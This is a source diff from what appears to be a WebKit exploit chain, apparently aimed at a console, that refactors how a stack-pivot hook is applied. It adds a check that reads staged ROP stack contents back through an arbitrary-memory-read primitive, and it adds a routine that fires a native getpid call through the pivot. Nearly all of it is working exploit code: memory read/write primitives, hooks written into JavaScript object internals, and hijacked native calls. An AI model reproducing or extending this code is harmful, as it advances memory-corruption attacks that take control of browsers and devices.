@@ -249,6 +249,25 @@ export function verifySlabContent(p, prep) {
     return out;
 }
 
+/** Stack qwords at RSP must match stackDv (layout written to K backing). */
+export function verifyStackContent(p, prep) {
+    const out = { ok: true, reasons: [] };
+    if (!prep || !prep.M || !prep._layout || prep._layout.at == null)
+        return { ok: false, reasons: ["no layout"] };
+    const M = prep.M;
+    const at = prep._layout.at;
+    const n = Math.min(6, prep._layout.insts || 0);
+    for (let i = 0; i < n; i++) {
+        const staged = readDvU64(M.stackDv, at + 8 * i);
+        let mem = null;
+        try { mem = p.read8(M.K.add32(at + 8 * i)); } catch (_) { mem = null; }
+        if (!mem || String(mem) !== String(staged))
+            out.reasons.push("[" + i + "] mem=" + mem + " want=" + staged);
+    }
+    out.ok = out.reasons.length === 0;
+    return out;
+}
+
 /** One ctx + pivot handles — call while heap is fresh (PRIMITIVE-OK). */
 export function prepNativeChain(p, off, webkitBase, cap) {
     if (!p || !off || !webkitBase)
@@ -624,6 +643,24 @@ function writePivotHookDual(p, prep, off) {
     return site0;
 }
 
+function applyPivotHook(p, prep, off, opts) {
+    opts = opts || {};
+    const mode = opts.hook || "cell";
+    if (mode === "dual") {
+        writePivotHookDual(p, prep, off || {});
+        return;
+    }
+    if (mode === "bf")
+        bisectHookPivotButterfly(p, prep, G0_HOOK_POOPS);
+    else if (mode === "bf30")
+        bisectHookPivotButterfly(p, prep, [0x30]);
+    else {
+        const hookOff = mode === "cell30" ? 0x30
+            : (opts.hookOff != null ? opts.hookOff : 0);
+        bisectHookPivotAt(p, prep, hookOff);
+    }
+}
+
 function restorePivotHook(p, prep) {
     if (prep._bisect && prep._bisect.multiSaved) {
         for (let i = 0; i < prep._bisect.multiSaved.length; i++) {
@@ -801,6 +838,16 @@ export function fireNativeCallBisect(p, prep, off) {
     return fireNativeCall(p, prep, off);
 }
 
+export function firePivotGetpid(p, prep, libkernelBase, off, stubOffOverride, opts) {
+    if (!prep || !prep.M || !prep.G)
+        throw new Error("firePivotGetpid: no prep");
+    stageGetpid(p, prep, libkernelBase, off, stubOffOverride);
+    const content = verifySlabContent(p, prep);
+    if (!content.ok)
+        throw new Error("firePivotGetpid: slab content: " + content.reasons.join("; "));
+    return fireNativeCall(p, prep, off, opts);
+}
+
 export function firePivotSmoke(p, prep, off, opts) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("firePivotSmoke: no prep");
@@ -820,14 +867,7 @@ export function fireNativeCall(p, prep, off, opts) {
         p.write8(prep.mainMf, prep.G.G0);
         prep.mainArmed = true;
     }
-    const hookMode = opts.hook || "dual";
-    if (hookMode === "bf") {
-        bisectHookPivotButterfly(p, prep, G0_HOOK_POOPS);
-    } else if (hookMode === "dual") {
-        writePivotHookDual(p, prep, off || {});
-    } else {
-        writePivotHook(p, prep, off || {});
-    }
+    applyPivotHook(p, prep, off, opts);
     Math.expm1(prep.pivotObj);
     restorePivotHook(p, prep);
     p.write8(prep.mainMf, prep.mainOrig);
@@ -842,8 +882,8 @@ export function fireUsleep(p, prep, libkernelBase, off, usec) {
     return fireNativeCall(p, prep, off);
 }
 
-export function fireGetpid(p, prep, off) {
-    return fireNativeCall(p, prep, off);
+export function fireGetpid(p, prep, off, opts) {
+    return fireNativeCall(p, prep, off, opts);
 }
 
 export function runGetpidFromPrep(p, prep, libkernelBase, off) {
